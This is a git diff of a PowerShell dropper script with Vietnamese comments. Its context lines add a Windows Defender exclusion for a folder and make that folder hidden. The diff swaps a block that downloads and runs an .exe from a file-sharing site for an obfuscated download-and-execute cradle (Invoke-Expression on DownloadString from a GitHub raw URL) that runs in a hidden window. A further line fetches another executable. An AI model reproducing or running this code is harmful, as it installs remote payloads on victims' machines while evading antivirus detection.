@@ -27,21 +27,9 @@ Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
 
-
-$filePath = "$folderPath\powershellv5.exe"
-$url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"
-
-# Tạo thư mục nếu chưa tồn tại
-if (!(Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath -Force
-}
-
-# Kiểm tra nếu file chưa tồn tại thì tải về
-if (!(Test-Path $filePath)) {
-    Invoke-WebRequest -Uri $url -OutFile $filePath
-}
-
-Start-Process -FilePath $filePath -NoNewWindow
+$shellcode = ("https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/antiremove")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $filePath = "$folderPath\hitler.exe"
 $url = "https://anonsharing.com/file/8c1a24ed85d74236/verify_(3).exe"
